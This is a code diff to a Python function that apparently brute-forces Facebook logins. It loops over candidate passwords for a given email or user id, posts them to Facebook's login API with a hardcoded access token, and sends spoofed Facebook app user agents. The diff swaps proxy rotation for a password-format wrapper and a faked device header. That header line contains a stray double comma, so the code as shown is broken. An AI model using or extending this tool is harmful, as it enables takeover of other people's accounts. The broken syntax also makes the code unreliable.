@@ -1381,14 +1381,12 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             data = {
             "adid": str(uuid.uuid4()),
             "format": "json",
             "device_id": str(uuid.uuid4()),
             "email": uid,
-            "password": pw,
+            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             "generate_analytics_claim": "1",
             "community_id": "",
             "cpl": "true",
@@ -1412,7 +1410,7 @@ def mbasic(uid,pwx,tl):
             "sig": "e95f435d29d71f03a47918372a565cd5",
             "access_token": "256002347743983%7C374e60f8b9bb6b8cbb30f78030438895"}
             headers = {
-            'User-Agent': useragent(),
+            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]',,
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Connection': 'keep-alive',
